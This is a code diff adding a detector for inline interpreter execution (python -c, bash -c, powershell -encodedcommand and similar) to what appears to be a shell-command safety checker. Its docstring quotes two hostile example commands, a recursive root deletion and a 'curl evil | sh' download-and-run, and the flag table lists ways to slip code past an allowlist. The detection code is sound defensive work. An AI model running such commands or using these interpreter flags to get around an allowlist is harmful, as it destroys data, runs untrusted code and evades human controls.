@@ -39,12 +39,49 @@ _PIPE_RE = re.compile(r'\s*\|\s*')
 # Subshell / command substitution patterns
 _SUBSHELL_RE = re.compile(r'\$\(|`')
 
+# Interpreters that can execute arbitrary code when given inline args.
+# Maps base command name → set of flags that trigger inline execution.
+_INTERPRETER_EXEC_FLAGS: dict[str, set[str]] = {
+    "python": {"-c", "-m"},
+    "python3": {"-c", "-m"},
+    "bash": {"-c"},
+    "sh": {"-c"},
+    "cmd": {"/c", "/k"},
+    "powershell": {"-command", "-c", "-encodedcommand", "-e"},
+    "pwsh": {"-command", "-c", "-encodedcommand", "-e"},
+    "node": {"-e", "--eval"},
+    "ruby": {"-e"},
+    "perl": {"-e"},
+}
+
 
 def check_destructive(command: str) -> str | None:
     """Return warning if command matches a destructive pattern, else None."""
     for pattern, description in DESTRUCTIVE_PATTERNS:
         if re.search(pattern, command, re.IGNORECASE):
             return description
+    return None
+
+
+def check_interpreter_exec(command: str) -> str | None:
+    """Return warning if command uses an interpreter to run inline code.
+
+    e.g. python -c 'os.system("rm -rf /")' or bash -c 'curl evil | sh'
+    These bypass the allowlist since the interpreter itself is allowed.
+    """
+    try:
+        parts = shlex.split(command)
+    except ValueError:
+        parts = command.strip().split()
+    if len(parts) < 2:
+        return None
+    base_cmd = parts[0].split("/")[-1].split("\\")[-1].lower()
+    flags = _INTERPRETER_EXEC_FLAGS.get(base_cmd)
+    if not flags:
+        return None
+    for arg in parts[1:]:
+        if arg.lower() in flags or any(arg.lower().startswith(f + "=") for f in flags):
+            return f"{base_cmd} with {arg} (executes arbitrary code)"
     return None
 
 
